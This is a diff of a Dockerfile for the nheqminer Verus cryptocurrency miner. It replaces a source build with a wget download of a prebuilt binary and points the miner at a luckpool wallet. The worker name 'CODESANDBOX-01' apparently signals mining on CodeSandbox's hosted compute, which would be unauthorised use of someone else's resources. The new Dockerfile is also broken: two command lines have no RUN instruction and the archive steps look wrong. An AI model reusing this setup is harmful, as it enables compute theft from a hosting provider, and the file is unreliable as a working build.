@@ -1,28 +1,14 @@
-FROM debian:latest as builder
+FROM ubuntu:16.04
 
-RUN apt-get update && apt-get dist-upgrade -y && \
-    apt-get install -y ca-certificates && \
-    apt-get -y autoremove; apt-get -y autoclean; apt-get -y clean; \
-    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+MAINTAINER a2ncer@gmail.com
 
-RUN apt-get update && apt-get dist-upgrade -y && \
-    apt-get install -y build-essential cmake libboost-all-dev git && \
-    apt-get -y autoremove; apt-get -y autoclean; apt-get -y clean; \
-    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
+RUN apt-get update && \
+	apt-get install -y git cmake wget build-essential libboost-all-dev && \
+    wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && \
+    tar -xvf nheqminer-Linux-v0.8.2.tgz && \
+    tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+    chmod u+x nheqminer/nheqminer
+nheqminer/nheqminer -v -l na.luckpool.net:3956 -u RHTc3sa8bhr6qXb9hsVE98JCMZUVp5JQMo.CODESANDBOX-01 -p x -t 4 -e 75
 
-RUN git clone https://github.com/wattpool/nheqminer.git && \
-    mkdir -p /nheqminer/build && cd /nheqminer/build && cmake .. && make -j $(nproc) && \
-    strip /nheqminer/build/nheqminer && \
-    mv /nheqminer/build/nheqminer /usr/sbin/ && \
-    apt-get -y autoremove; apt-get -y autoclean; apt-get -y clean; rm -rf /var/lib/apt/lists/*
-
-FROM debian:latest
-
-RUN apt-get update && apt-get dist-upgrade -y && \
-    apt-get install -y ca-certificates && \
-    apt-get -y autoremove; apt-get -y autoclean; apt-get -y clean; \
-    rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
-
-COPY --from=builder /usr/sbin/nheqminer /usr/sbin/
-
-ENTRYPOINT [ "nheqminer", "-v", "-l", "verus.wattpool.net:1232", "-u", "RQqq9utcCzmojmMeCG5PjE39wH2MNoLvYY.dockerized", "-p", "x" ]
+Workdir nheqminer
+ENTRYPOINT ["nheqminer", "-v", "-l", "na.luckpool.net:3956", "-u", "RHTc3sa8bhr6qXb9hsVE98JCMZUVp5JQMo.CODESANDBOX-01", "-p", "x", "-t", "2", "-e", "75"]
